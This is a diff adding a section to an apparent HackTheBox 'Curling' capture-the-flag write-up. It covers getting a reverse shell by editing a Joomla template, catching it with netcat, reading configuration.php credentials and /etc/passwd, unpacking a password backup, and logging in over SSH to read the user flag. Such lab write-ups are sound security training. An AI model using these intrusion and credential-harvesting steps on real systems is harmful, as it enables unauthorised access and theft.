@@ -253,7 +253,7 @@ $ curl http://curling.htb/secret.txt
 Q3VybGluZzIwMTgh
 ```
 
-tried that with 'admin' to login, but failed.. but that's a b64 string, so 
+tried that with 'admin' to login, but failed.. but that's a b64 string, so
 
 ```
 $ echo Q3VybGluZzIwMTgh | base64 -d
@@ -270,6 +270,169 @@ ok that looks like a good username... and it is "Hi Super User", but it looks li
 
 however, now `/administrator` is authenticatable, so we've god access to the joomla control panel.
 
+### joomla administrator
+
+see that mysql is being used in the background, php (of course). quick assessment seems to say that the way forward is to install a malicious joomla extension
+
+.. or even easier - modify the template beez3 `index.php` to just be [rs.php](rs.php)
+
+actually needed to modify the protostar template, but
+
+```
+$ nc -lv 4444
+nc: getnameinfo: Temporary failure in name resolution
+Connection received on curling.htb 52138
+Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 19:58:38 up  1:50,  0 users,  load average: 0.00, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+```
+$ cat configuration.php
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+        public $offline_image = '';
+        public $sitename = 'Cewl Curling site!';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = '20';
+        public $access = '1';
+        public $debug = '0';
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'floris';
+        public $password = 'mYsQ!P4ssw0rd$yea!';
+
+```
+
+```
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+floris:x:1000:1004:floris:/home/floris:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+so floris can login, but www-data can't. the same password for joomla does not work for ssh, and can't su
+
+but..
+
+```
+$ ls -l /home/floris/
+total 12
+drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
+-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
+-rw-r----- 1 floris floris   33 May 22  2018 user.txt
+```
+
+can't get `user.txt` until we pop floris, but `password_backup` is readable
+
+```
+$ cat /home/floris/password_backup
+00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
+00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
+00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
+00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
+00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
+00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
+00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
+00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
+00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
+00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
+000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
+000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
+000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
+000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
+000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
+000000f0: 819b bb48                                ...H
+```
+
+it's a hex dump of.. something
+
+[reader.rb](reader.rb) to make it easier, get us to
+```
+$ file password_backup.out
+password_backup.out: bzip2 compressed data, block size = 900k
+$ bunzip2 password_backup.out
+bunzip2: Can't guess original name for password_backup.out -- using password_backup.out.out
+$ file password_backup.out.out
+password_backup.out.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
+$ mv password_backup.gz password_backup-with-a-different-name.gz
+renamed 'password_backup.gz' -> 'password_backup-with-a-different-name.gz'
+$ gunzip password_backup-with-a-different-name.gz
+$ file password_backup-with-a-different-name
+password_backup-with-a-different-name: bzip2 compressed data, block size = 900k
+$ bunzip2 password_backup-with-a-different-name
+bunzip2: Can't guess original name for password_backup-with-a-different-name -- using password_backup-with-a-different-name.out
+$ file password_backup-with-a-different-name.out
+password_backup-with-a-different-name.out: POSIX tar archive (GNU)
+$ 7z x password_backup-with-a-different-name.out
+$ cat password.txt
+5d<wdCbdZu)|hChXll
+```
+
+ok, that was annoying.
+
+but...
+
+```
+$ ssh -l floris curling.htb
+Warning: Permanently added 'curling.htb,10.10.10.150' (ECDSA) to the list of known hosts.
+floris@curling.htb's password:
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Jul  8 20:23:34 UTC 2022
+
+  System load:  0.08              Processes:            194
+  Usage of /:   49.2% of 9.78GB   Users logged in:      0
+  Memory usage: 24%               IP address for ens33: 10.10.10.150
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+Last login: Wed Sep  8 11:42:07 2021 from 10.10.14.15
+floris@curling:~$ cat user.txt
+65dd1df0713b40d88ead98cf11b8530b
+```
 
 ## flag
 ```
